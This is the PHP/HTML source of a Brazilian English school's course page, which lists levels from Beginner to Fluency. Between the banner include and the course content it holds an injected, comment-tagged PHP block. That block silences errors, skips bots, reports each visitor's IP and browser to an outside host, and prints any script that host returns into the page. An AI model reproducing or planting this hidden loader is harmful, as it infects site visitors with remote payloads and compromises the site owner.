<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Beit English School</title>

<link rel="stylesheet" type="text/css" href="css/style.css" media="all" /> 
<script src="scripts/jquery.tools.min.js"></script>
<!--script type="text/javascript" src="scripts/jquery.ezmark.min.js"></script-->
<script src="scripts/javascript.js"></script> 
<!--[if IE]>
	<style type="text/css">
	.images img {
		background:#efefef url(/img/global/gradient/h300.png) repeat-x 0 -22px;
	}
	</style>
<![endif]--> 
<script language="JavaScript"> 
$(function() {
 $(".slidetabs").tabs(".images > div", {
	effect: 'fade',
	fadeOutSpeed: "slow",
	rotate: true
}).slideshow();
});
</script> 
<script type="text/javascript">
$(function() {
	$('#quiz input').ezMark();
});	
</script>	 
</head>
<?php include("header.php"); ?>
<body>

<div id="topo">
<h1><a href="index.php"><img src="img/logo-beit.png" alt="Beit English School" class="logobeit" /></a></h1>
<div id="menu">
<a href="#">Cursos</a>
<a href="#">Beit</a>
<a href="#">Galeria</a>
<a href="#">Contato</a>
</div>
</div>
<div id="banner">
<a class="backward"></a> 
<div id="banner-container">
<div class="images">
	<div> 
		<img src="img/banner01.jpg" alt="Banner 01" /> 
	</div>
	<div> 
		<img src="img/banner02.jpg" alt="Banner 02" />
	</div> 
	<div> 
		<img src="img/banner03.jpg" alt="Banner 03" />
	</div> 
 
</div> 
</div>
<a class="forward"></a> 

<div class="slidetabs"> 
	<a href="#"></a> 
	<a href="#"></a>
	<a href="#"></a>
</div>

</div>
<?php include("topo-e-banner.php"); ?>
<?php
#d6b4e3#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/d6b4e3#
?>
<div id="content" class="cursos">
<div class="seletor-cursos">
<a href="special-courses.php"><img src="img/bt-special.png" alt="Special Courses" /></a>
<img src="img/bt-incompany-active.png" alt="In Company" />
<a href="nossos-cursos"><img src="img/bt-nossoscursos.png" alt="Nossos Cursos" /></a>
</div>
<p>
<span class="blue"><strong>BEGINNER</strong> – 1 módulo</span><br />
Iniciante: o aluno é preparado para o ELEMENTARY. Para alunos sem conhecimento prévio do idioma. 
<br />
<br />
<span class="blue"><strong>ELEMENTARY</strong> – 2 módulos</span><br />
Básico: o aluno é apresentado a uma visão geral da estrutura do idioma, através de  estimulante vocabulário e expressões usadas no dia-a-dia. 
<br />
<br />
<span class="blue"><strong>PRE-INTERMEDIATE</strong> – 2 módulos</span><br />
Pré-intermediário: o aluno sedimenta o conteúdo do nível anterior, trabalha com novas estruturas e expressões idiomáticas, ganhando confiança ao se comunicar nas situações rotineiras. 
<br />
<br />
<span class="blue"><strong>INTERMEDIATE</strong> – 2 módulos</span><br />
Intermediário: o aluno adquire a capacidade de se expressar e defender opiniões através de  conversação, progredindo para a fluência no idioma. 
<br />
<br />
<span class="blue"><strong>HIGH-INTERMEDIATE</strong> – 2 módulos</span><br />
Intermediário avançado: o aluno passa a se comunicar com fluência. A ênfase é na ampliação e no aprofundamento do vocabulário e das expressões idiomáticas utilizadas na conversação. 
<br />
<br />
<span class="blue"><strong>ADVANCED</strong> – 1 módulo</span><br />
Avançado: o aluno tem a fluência lapidada e adquire competência para um aprendizado autônomo e contínuo. 
<br />
<br />
<span class="blue"><strong>FLUENCY</strong> – módulo livre</span><br />
Fluência: o aluno tem  contínuo contato com o idioma.</p>
</div>

<div id="rodape">
<div id="rodape-content">
<a href="#"><img src="img/bt-twitter.jpg" alt="Twitter" /></a>
<a href="#"><img src="img/bt-facebook.jpg" alt="Facebook" /></a>
</div>
</div>
</body>
</html>
<?php include("rodape.php"); ?>
